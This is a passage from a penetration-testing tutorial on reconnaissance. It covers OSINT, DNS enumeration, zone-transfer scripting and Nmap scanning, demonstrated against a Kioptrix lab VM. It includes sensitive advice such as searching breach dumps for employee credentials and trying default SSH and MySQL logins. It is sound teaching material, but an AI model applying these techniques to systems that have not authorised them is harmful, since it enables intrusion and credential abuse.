<p>While it may be tempting to skimp on recon (scanning takes time and isn&#8217;t terribly exciting), this will only lead to missed vulnerabilities and headaches later - being exhaustive in enumeration (where possible - care should be taken when scanning through a firewall or when theres a possibility of alerting security endpoints / defenders) allows confidence when working through the later stages of an engagement.</p>
</div>
<div class="paragraph">
<p>The art of offensive security is akin to solving a puzzle, which is awfully hard when we&#8217;re working blind. Recon gives us our eyes and helps us find the pieces.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_open_source_intelligence_osint">Open Source Intelligence (OSINT)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>To kick off our engagement, we gather as much information as possible <strong>without touching the target</strong>. This means we trawl public sources of information and interact with the victim <strong>as a non-malicious party would</strong> (e.g. browsing websites).</p>
</div>
<div class="paragraph">
<p>I am far from an expert in OSINT. I&#8217;ll briefly skim basic OSINT techniques that we should always cover and leave it to the reader to experiment and read further. I personally recommend Open Source Intelligence Techniques by the wonderful Michael Bazzell.</p>
</div>
<div class="sect2">
<h3 id="_harvesting_user_information">Harvesting User Information</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<strong>Be careful to stay within RoE.</strong> Some clauses may prevent the investigation of employees or similar.
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Social media and professional networking sites (Twitter, Facebook, mySpace, LinkedIn, Seek &#8230;&#8203;) provide a treasure trove of information for attackers and are especially useful for social engineering campaigns and password attacks. Moreover, job listings may hint at the tech stack in use, such as backend web servers and databases.</p>
</div>
<div class="paragraph">
<p>For organisations with especially sloppy opsec, we might even find sensitive information leaked in comments or in the background of photos! (Post-it notes are a natural habitat for passwords&#8230;&#8203;)</p>
</div>
</div>
<div class="sect2">
<h3 id="_public_code_repositories">Public Code Repositories</h3>
<div class="paragraph">
<p>We should review public code repositories - organisations (and individual developers!) often host code on public repos (Gitlab, Github, Bitbucket &#8230;&#8203;) that may disclose vulnerabilities and expose private secrets (such as API keys and credentials).</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>This is something to keep in mind when escalating privileges or looting machines - development environments will almost always contain secret keys and production code.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>It is also prudent to locate developer accounts on technical forums (Stack Overflow, Firefox &amp; Microsoft Dev Forums, &#8230;&#8203;) - developers may leak private details in code snippets, screenshots or otherwise; especially when asking for programming assistance.</p>
</div>
</div>
<div class="sect2">
<h3 id="_compromised_credentials">Compromised Credentials</h3>
<div class="paragraph">
<p>Collations of password dumps from breaches should be searched to match known employee emails / usernames. User credentials may remain the same after a breach on an unrelated service or have weak mutations (often a number or punctuation character appended to the end) applied to them.</p>
</div>
</div>
<div class="sect2">
<h3 id="_web_server_content">Web Server Content</h3>
<div class="paragraph">
<p>It is unlikely that sensitive content will be found when browsing public facing websites, but it may assist in better understanding the target. Besides, we aim to be <strong>exhaustive</strong> where possible.</p>
</div>
<div class="paragraph">
<p>We may want to construct wordlists using a tool such as cewl, then mutate them to serve as sources for password attacks and directory busting.</p>
</div>
<div class="paragraph">
<p>For example, to grab all plaintext words with a minimum length of 6:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">cewl &lt;URL&gt;</span><span class="w"> </span><span class="nt">-m</span> 6 <span class="nt">-w</span> &lt;OUTPUT FILE&gt;</code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>cewl https://www.unsw.edu.au/ <span class="nt">-m</span> 6
<span class="go">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Global
University
Sydney
Member
Header
Professor
Australia
Alliance
Research
Former
President
Chancellor
Footer
Officers
Universities
Council
</span><span class="c">...</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Moreover, assets (PDFs, DOCs, images) that haven&#8217;t been purged of their metadata can reveal anything from workstation hostnames and employee handles to endpoint architectures and software versions.</p>
</div>
<div class="paragraph">
<p>One such tool, Exiftool, reads and manipulates EXIF data.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">exiftool -l -s &lt;FILE&gt;</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/#</span><span class="w"> </span>exiftool <span class="nt">-l</span> <span class="nt">-s</span> DSCN0010.jpg
<span class="go">ExifTool Version Number         : 12.10
File Name                       : DSCN0010.jpg
Directory                       : .
File Size                       : 158 kB
File Modification Date/Time     : 2021:03:14 22:02:10+11:00
File Access Date/Time           : 2021:03:14 22:02:30+11:00
File Inode Change Date/Time     : 2021:03:14 22:02:10+11:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Image Description               :
</span><span class="c">...
</span><span class="go">Software                        : Nikon Transfer 1.1 W
Modify Date                     : 2008:11:01 21:15:07
</span><span class="c">...
</span><span class="go">GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 14:27:07.24
GPS Satellites                  : 06
GPS Img Direction Ref           : Unknown ()
GPS Map Datum                   : WGS-84
GPS Date Stamp                  : 2008:10:23
</span><span class="c">...
</span><span class="go">GPS Date/Time                   : 2008:10:23 14:27:07.24Z
GPS Latitude                    : 43 deg 28' 2.81" N
GPS Longitude                   : 11 deg 53' 6.46" E
</span><span class="c">...
</span><span class="go">GPS Position                    : 43 deg 28' 2.81" N, 11 deg 53' 6.46" E</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We should also check if web content has been archived (e.g. Via the Wayback Machine or through search engines).</p>
</div>
<div class="sect3">
<h4 id="_search_engine_dorks">Search Engine Dorks</h4>
<div class="paragraph">
<p>TODO</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_osint_services">OSINT Services</h3>
<div class="paragraph">
<p>TODO
Stuff like Netcraft, Recon-ng, Shodan
<strong>maltego</strong>
theHarvester (<a href="https://github.com/laramies/theHarvester" class="bare">https://github.com/laramies/theHarvester</a>) enumerate names, emails, subdomains and URLS related to search terms -.</p>
</div>
</div>
<div class="sect2">
<h3 id="_dns_enumeration">DNS Enumeration</h3>
<div class="sect3">
<h4 id="_dns_refresher">DNS Refresher</h4>
<div class="paragraph">
<p>Recall that DNS translates domains into IP addresses. When a hostname needs to be resolved, it is passed to the OS' DNS client, which then forwards the request to an external DNS server.
The first server in the chain is known as the DNS recursor. The recursor queries a server in the DNS root zone, which responds with the address of the server responsible for the zone containing the Top Level Domain (TLD) (e.g. .com).
The recursor then queries the TLD DNS server for the address of the authoritative nameserver for the hostname domain. This nameserver contains the DNS records in a local database known as the zone file. It usually hosts two zones for each domain: the forward lookup zone (to find an IP for a hostname) and the reverse lookup zone (find hostname for ip). The recursor then provides the DNS client with the IP for the hostname.</p>
</div>
<div class="paragraph">
<p>To improve performance, most systems use DNS caching to store local copies of DNS records at various stages of the lookup process.</p>
</div>
</div>
<div class="sect3">
<h4 id="_dns_servers">DNS Servers</h4>
<div class="paragraph">
<p>Each domain can use different types of DNS records. Some common types are listed below.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Record</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">NS</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Nameserver record that contains the name of the authoritative servers hosting the DNS records for a domain</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">A</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Host record, contains the IP address of a hostname</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">MX</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Mail exchange that contains names of the servers responsible for handling email for the domain</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">PTR</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Pointer records used in reverse lookup, used to find the records associated with an IP</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">CNAME</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Canonical name records used to create aliases for other host records</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">TXT</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Contains arbitrary data</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>We can use the <code>host</code> command to find records for a hostname. By default it returns the A record but flags can be used to find others.</p>
</div>
<div class="paragraph">
<p>For example, to list MX records we specify the type with the <code>-t</code> switch.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">host -t mx &lt;DOMAIN&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>The <code>-a</code> flag returns all records, equivalent to verbosely printing all: <code>-v -t ANY</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">host -a &lt;DOMAIN&gt;</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_forward_lookup_bruteforce">Forward Lookup Bruteforce</h4>
<div class="paragraph">
<p>We can attempt to guess DNS records and check the response for valid hostnames. This can be done fairly easily with a wordlist (SecLists has some good ones) and a bit of scripting.</p>
</div>
<div class="paragraph">
<p>TODO: Write example forward lookup bruteforce</p>
</div>
</div>
<div class="sect3">
<h4 id="_reverse_lookup_bruteforce">Reverse Lookup Bruteforce</h4>
<div class="paragraph">
<p>We can scan IP ranges to see if a reverse lookup reveals any hostnames.
For example, in bash:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="bash"><span class="k">for </span>ip <span class="k">in</span> <span class="o">{</span>0..255<span class="o">}</span><span class="p">;</span> <span class="k">do </span>host 10.10.10.<span class="nv">$ip</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Unsuccessful"</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_zone_transfer">Zone Transfer</h4>
<div class="paragraph">
<p>A zone transfer is a database replication between related DNS servers in which the zone file is copied from a master server to a slave. This file contains all the DNS names for that zone. Zone transfers should only be allowed to authorized slaves, but misconfigured servers sometimes allow anyone asking for a copy of the zone file to receive one.
The <code>host</code> command can be used to initiate a zone transfer.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">host -l &lt;DOMAIN&gt;</span><span class="w"> </span>&lt;NAMESERVER&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>An example script for automating nameserver identification and attempting a zone transfer:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
	</span><span class="nb">echo</span> <span class="s2">"[*] Usage : </span><span class="nv">$0</span><span class="s2"> &lt;domain name&gt;"</span>
	<span class="nb">exit </span>0
<span class="k">fi
for </span>server <span class="k">in</span> <span class="si">$(</span>host <span class="nt">-t</span> ns <span class="nv">$1</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> <span class="k">do
	</span>host <span class="nt">-l</span> <span class="nv">$1</span> <span class="nv">$server</span> | <span class="nb">grep</span> <span class="s2">"has address"</span>
<span class="k">done</span></code></pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_putting_it_together_osint">Putting it Together: OSINT</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_service_scanning">Service Scanning</h2>
<div class="sectionbody">
<div class="paragraph">
<p>We perform service scanning to identify a victim&#8217;s attack surface (in terms of open and filtered ports) and fingerprint their listening services.</p>
</div>
<div class="paragraph">
<p>Nmap (Network Mapper) is a host discovery and service scanning tool - it functions by sending varying sequences of packets (based on the scan mode) to target ports on a host to coax a response, then parses the banner.</p>
</div>
<div class="paragraph">
<p>It supports OS fingerprinting (works primarily on packet TTL differences that are compared against a database of "fingerprints"), service version scanning (interrogating the services for service-specific information after initial identification using a DB of probes) and a scripting engine that often comes in handy for identifying low hanging fruit.</p>
</div>
<div class="paragraph">
<p>We specify the hosts and port ranges we want to scan (or provide them through a file) and provide any switches to modify scan behaviour. For example, to discover hosts on the local subnet and scan for potential web servers:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">nmap -p 80 192.168.0.1/24</span></code></pre>
</div>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Traditional port scanning is noisy and could be disruptive. Be careful when scanning a live environment.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Often service scanning will take time. We should manually investigate the host while we run automated tools to increase productivity. (Or just clock off for lunch).</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_stealth_scanning_syn_scan">"Stealth" Scanning (SYN Scan)</h3>
<div class="paragraph">
<p>SYN scanning or "Stealth" scanning (a bit of a misnomer now, not so stealthy as of this last decade or so) involves completing only the first half of the TCP handshake (sending a SYN packet then receiving a SYN/ACK reply) before sending a RST packet. A long time ago, these connections wouldn&#8217;t be logged by firewalls but these days any such solution worth its salt recognises SYN scan patterns.</p>
</div>
<div class="paragraph">
<p>SYN scanning is the default behaviour for Nmap and can be explicitly invoked with the <code>-sS</code> flag.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">nmap -sS &lt;IP&gt;</span></code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<a class="image" href="https://upload.wikimedia.org/wikipedia/commons/9/98/Tcp-handshake.svg"><img src="Images/TCPHandshake.png" alt="TCPHandshake"></a>
</div>
<div class="title">Figure 1. TCP Handshake Diagram</div>
</div>
<div class="paragraph">
<p>SYN scanning is quick (since we don&#8217;t have to complete the TCP handshake), quiet and multiplatform (works against all hosts that support the TCP stack). This is usually our go to scan mode (when we have root privileges, which is required to send raw packets on UNIX systems).</p>
</div>
</div>
<div class="sect2">
<h3 id="_connect_scanning">Connect Scanning</h3>
<div class="paragraph">
<p>Connect scanning doesn&#8217;t issue raw packets (instead, it relies on the OS network syscalls to communicate with hosts) and thus is usable by unprivileged users. In almost all other cases, SYN scanning is preferred.</p>
</div>
<div class="paragraph">
<p>Connect scanning is invoked with the <code>-sT</code> flag.</p>
</div>
</div>
<div class="sect2">
<h3 id="_udp_scanning">UDP Scanning</h3>
<div class="paragraph">
<p>As the name implies, UDP scanning covers UDP ports. It sends an empty UDP packet (excepting common service ports) to target ports and awaits any response (open) or an ICMP unreachable error (closed). No response may indicate a filtered port - it is hard to tell with UDP since most services will not respond to malformed packets.</p>
</div>
<div class="paragraph">
<p>UDP scanning can be invoked with the <code>-sU</code> flag. It can be run alongside a TCP scan mode.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Although UDP ports may be more difficult to scan (having slower and less detailed interrogations), taking inventory of UDP ports is crucial during engagements. Exploitable UDP services are quite common - for example, TFTP or video game servers - and open UDP ports may hint at running processes.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect2">
<h3 id="_output_types">Output Types</h3>
<div class="paragraph">
<p>A recon tool is only as good as its output. Nmap supports a number of output switches which store scan results in various formats, like so:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">nmap -oN results.txt &lt;IP&gt;</span></code></pre>
</div>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-oN</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Redirects the output to a file without major modification.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-oX</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Formats the output as XML and redirects it to a file. Most useful when programmatically parsing the output of Nmap.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-oG</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Formats the output to be greppable and redirects it to a file. Generally inferior to the XML format but is slightly more human readable.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-oA</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Store the result in all formats, with the appropriate extensions (.nmap, .xml, .gnmap)</p></td>
</tr>
</tbody>
</table>
</div>
<div class="sect2">
<h3 id="_nmap_scripting_engine_nse">Nmap Scripting Engine (NSE)</h3>
<div class="paragraph">
<p>Nmap supports the Nmap Scripting Engine (NSE), which allows the creation and running of scripts designed to augment our service recon. These scripts range from user enumeration and common password bruteforces to scanners for major vulnerabilities (like heartbleed).</p>
</div>
<div class="paragraph">
<p>While these scripts might not be as flexible or powerful as dedicated tooling for specific services, firing appropriate scripts is usually a good idea. We never know when some scripts catch things we might otherwise miss. As always, being exhaustive is the key to recon.</p>
</div>
<div class="paragraph">
<p>The <code>--script=&lt;SCRIPT&gt;</code> switch is used to load a script, while <code>--script-args=&lt;OPT1=VALUE,OPT2=VALUE&gt;</code> supplies any arguments.</p>
</div>
<div class="paragraph">
<p>Nmap scripts are usually installed to <code>/usr/share/nmap/scripts</code>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_common_useful_flags">Common Useful Flags</h3>
<div class="paragraph">
<p>Nmap has a number of useful switches that we will find ourselves commonly using.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-p &lt;PORTS&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify which ports (either comma separated values or a range) to scan.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--top-ports &lt;N&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Scan the N most frequent ports. By default, Nmap scans the top 1000 ports.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-p-</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Shorthand for scanning the entire port range (1-65535).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-v</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Increase the verbosity of the output. Ports will be shown as they are found.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-sC</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Run default NSE scripts.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-sV</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Run version detection probes for services.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-O</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Run OS fingerprinting.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-A</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enables many features including version detection, OS fingerprinting, default NSE scripts and traceroute.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-sn</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Disable port scanning (i.e. host discovery only).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-Pn</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Skip host discovery (assume host is live). Useful for when ping probes are blocked (e.g. firewalls).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-T&lt;0-5&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Set timing options. Ranges from very slow (0) to insanely fast (5). By default, Nmap runs at timing 3.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--resume &lt;FILENAME&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Resumes Nmap from an output file. Cannot be used with other switches (it will grab the behaviour of the scan from the logfile).</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>I recommend the man pages for Nmap and the official book - Nmap Network Scanning - as further reading.</p>
</div>
</div>
<div class="sect2">
<h3 id="_other_network_scanners">Other Network Scanners</h3>
<div class="paragraph">
<p>TODO
Unicornscan?
Masscan</p>
</div>
<div class="paragraph">
<p>Touch on combined tooling scripts such as Autorecon.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_putting_it_together_service_scanning">Putting it Together: Service Scanning</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Let&#8217;s put what we&#8217;ve learnt about service scanning into practice. I recommend getting a hold of the Kioptrix Level 1.1 VM image and following along (<a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/" class="bare">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a>).</p>
</div>
<div class="paragraph">
<p>Once we have the VM running (in this case, with a Bridged Adapter in VirtualBox), we check our subnet with <code>arp-scan</code> to identify the host&#8217;s IP.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~/VirtualBox VMs/Kioptrix1.1#</span><span class="w"> </span>arp-scan <span class="nt">-l</span>
<span class="go">Interface: wlan0, type: EN10MB, MAC: 74:70:fd:38:0c:48, IPv4: 192.168.1.239
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
</span><span class="c">...
</span><span class="go">192.168.1.102   08:00:27:bb:da:7e       PCS Systemtechnik</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>From here, we start both a quick and fully fledged scan (usually we&#8217;d go do some manual recon using information from the quick scan while the fully fledged scan runs).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~/VirtualBox VMs/Kioptrix1.1#</span><span class="w"> </span>nmap 192.168.1.102 <span class="nt">-Pn</span>
<span class="go">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:02 AEDT
Nmap scan report for 192.168.1.102
Host is up (0.00055s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh <i class="conum" data-value="1"></i><b>(1)</b>
80/tcp   open  http <i class="conum" data-value="2"></i><b>(2)</b>
111/tcp  open  rpcbind <i class="conum" data-value="3"></i><b>(3)</b>
443/tcp  open  https
631/tcp  open  ipp <i class="conum" data-value="4"></i><b>(4)</b>
3306/tcp open  mysql <i class="conum" data-value="5"></i><b>(5)</b>
MAC Address: 08:00:27:BB:DA:7E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>At first glance we see that the host has a few common services running on their default ports:</p>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>A Secure Shell (SSH) server. We should always guess some common credentials (e.g. <code>admin:admin</code>, variations of the hostname, <code>user:password</code>, &#8230;&#8203;). If we do obtain legitimate credentials, this could be our foothold onto the network.</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>A web server running on port 80. We note that the host serves HTTPS on 443. The web server should be our first port of call when it comes to manual investigation. We should also run some additional web specific tooling.</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>RPCbind maps RPC services to the ports on which they listen. We can use NSE scripts such as rpcinfo to enumerate services that have registered with RPCbind.</td>
</tr>
<tr>
<td><i class="conum" data-value="4"></i><b>4</b></td>
<td>The Internet Printing Protocol (IPP) is described by its title. This service is most likely listening as part of CUPS - Common Unix Printing System.</td>
</tr>
<tr>
<td><i class="conum" data-value="5"></i><b>5</b></td>
<td>A MySQL database is always a good target to investigate. The presence of a database suggests that the web server runs server side code that interacts with the DB which presents a juicy avenue of attack. Like with SSH (or any service that we can authenticate to without too much noise), we should try some default and common credentials.</td>
</tr>
</table>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~/VirtualBox VMs/Kioptrix1.1#</span><span class="w"> </span>nmap <span class="nt">-A</span> 192.168.1.102
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:03 AEDT
Nmap scan report for 192.168.1.102
Host is up (0.00055s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99) <i class="conum" data-value="1"></i><b>(1)</b>
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS)) <i class="conum" data-value="2"></i><b>(2)</b>
|_http-server-header: Apache/2.0.52 (CentOS)
</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
<span class="gp">111/tcp  open  rpcbind    2 (RPC #</span>100000<span class="o">)</span> <i class="conum" data-value="3"></i><b>(3)</b>
<span class="go">| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            913/udp   status
|_  100024  1            916/tcp   status
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- <i class="conum" data-value="4"></i><b>(4)</b>
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
</span><span class="gp">|_ssl-date: 2021-03-22T11:03:12+00:00;</span><span class="w"> </span>+3h59m59s from scanner time.
<span class="go">| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
631/tcp  open  ipp        CUPS 1.1 <i class="conum" data-value="5"></i><b>(5)</b>
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql      MySQL (unauthorized) <i class="conum" data-value="6"></i><b>(6)</b>
MAC Address: 08:00:27:BB:DA:7E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30 <i class="conum" data-value="7"></i><b>(7)</b>
Network Distance: 1 hop

Host script results:
|_clock-skew: 3h59m58s

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 192.168.1.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>The "full" TCP scan gives us some version info and confirms some of our suspicions.</p>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>The SSH server is OpenSSH running version 3.9p1. A quick check of CVE vulnerability databases suggests that directly exploiting this service is unfeasible (vulnerabilities are very old, mostly non-RCE, most likely patched as part of long term support, and have no public exploits - requiring R&amp;D for a working exploit and armed payload).</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>The web server is Apache 2.0.52. As with SSH, direct exploitation is unlikely. Note that the operating system here is identified as CentOS, most likely from some header strings.</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>RPCbind reports registered services that we can&#8217;t see from the outside - most likely listening on loopback.</td>
</tr>
